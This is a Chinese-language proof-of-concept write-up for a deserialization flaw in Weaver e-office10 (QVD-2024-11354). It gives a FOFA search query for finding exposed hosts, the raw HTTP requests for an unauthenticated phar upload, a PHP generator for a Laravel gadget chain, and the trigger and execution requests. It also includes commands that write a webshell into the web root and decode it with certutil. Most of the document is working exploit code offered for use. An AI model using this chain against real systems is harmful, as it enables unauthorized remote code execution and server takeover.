**漏洞描述**

泛微e-office10 attachment 模块存在反序列化漏洞（QVD-2024-11354），攻击者利用此漏洞可以未授权上传恶意phar文件，通过加载恶意phar文件实现反序列化，最终可导致远程代码执行。

漏洞影响版本: v10.0_20180516 < E-Office10 < v10.0_20240222

> fofa语法

```shell
 body="eoffice10" && body="eoffice_loading_ti"
```

 第1个请求,上传phar文件，数据包里是phar文件的二进制流

```yaml
POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
Host: xxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Content-Length: 536
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: multipart/form-data; boundary=dsfdsafdsffdsafdsfdfsdf

--dsfdsafdsffdsafdsfdfsdf
Content-Disposition: form-data; name="Filedata"; filename="register.inc"
Content-Type: image/jpeg

GIF89a<?php __HALT_COMPILER(); ?> //whoami.phar
--dsfdsafdsffdsafdsfdfsdf--


返回包
HTTP/1.1 200 OK
Date: Sat, 30 Mar 2024 08:15:43 GMT
Server: Apache
Cache-Control: no-cache, private
Vary: Accept-Encoding
Connection: close
Content-Type: application/json
Content-Length: 123

{"status":1,"data":{"attachment_id":"idid","attachment_name":"register.inc"},"runtime":"2.361"}
```



```php
?php

  declare(strict_types=1);

namespace Illuminate\Broadcasting {

  class PendingBroadcast {
    protected $events;
    protected $event;

    public function __construct($events, $event) {
      $this->events = $events;
      $this->event = $event;
    }
  }

  class BroadcastEvent {
    protected $connection;

    public function __construct($connection) {
      $this->connection = $connection;
    }
  }

}

namespace Illuminate\Bus {

  class Dispatcher {
    protected $queueResolver;

    public function __construct($queueResolver) {
      $this->queueResolver = $queueResolver;
    }

  }
}

namespace {
  $command = new \Illuminate\Broadcasting\BroadcastEvent("whoami");  
  $dispatcher = new \Illuminate\Bus\Dispatcher("system");
  $pendingBroadcast = new \Illuminate\Broadcasting\PendingBroadcast($dispatcher, $command);

  // 临时文件路径
  $tempPharPath = 'phar.phar';

  // 创建 Phar
  $phar = new \Phar($tempPharPath);
  $phar->startBuffering();
  $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
  $phar->addFromString('test.txt', 'test');
  $phar->setMetadata($pendingBroadcast);
  $phar->stopBuffering();


  $pharData = file_get_contents($tempPharPath);

  $base64PharData = base64_encode($pharData);

  $base64OutputFilePath = 'phar_base64.txt';
  file_put_contents($base64OutputFilePath, $base64PharData);


  unset($phar); 
  unlink($tempPharPath);

  echo "Base64编码的Phar数据已写入到当前目录文件 {$base64OutputFilePath}";

}
```

getshell需要生成2个字符串，修改上面的php代码，2个$command如下

```
// 第1个是写入php代码,我这里写的是phpinfo的base64编码$command = new \Illuminate\Broadcasting\BroadcastEvent("echo PD9waHAgcGhwaW5mbygpOyA/Pg== > ../www/eoffice10/server/public/shell.php");
// 第2个是进行base64解码$command = new \Illuminate\Broadcasting\BroadcastEvent('certutil -decode ../www/eoffice10/server/public/shell.php ../www/eoffice10/server/public/shell2.php');
```

第二步触发反序列化

```php
POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Content-Length: 69
Connection: close
Content-Type: application/x-www-form-urlencoded

source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
返回

HTTP/1.1 200 OK
Date: Sat, 30 Mar 2024 08:15:51 GMT
Server: Apache
Cache-Control: no-cache, private
Vary: Accept-Encoding
Connection: close
Content-Type: application/json
Content-Length: 85

{"status":1,"data":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1],"runtime":"0.342"}
```

第三步:执行得到结果

```php
POST /eoffice10/server/public/api/empower/import HTTP/1.1
Host: xxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Content-Length: 49
Connection: close
Content-Type: application/x-www-form-urlencoded

file=idididi //这里也可以加到干扰字符例如username=admin&password=admin&file=dfdsfdsfdsf&type=login

HTTP/1.1 200 OK
Date: Sat, 30 Mar 2024 08:22:39 GMT
Server: Apache
Cache-Control: no-cache, private
Vary: Accept-Encoding
Connection: close
Content-Type: application/json
Content-Length: 145

返回这个 no_file 才是对的其他都是错误的
{"status":0,"errors":[{"code":"no_file", "message":"\u6ce8\u518c\u6587\u4ef6\u4e0d\u5b58\u5728"}],"runtime":"0.322"}这里是回显结果
```

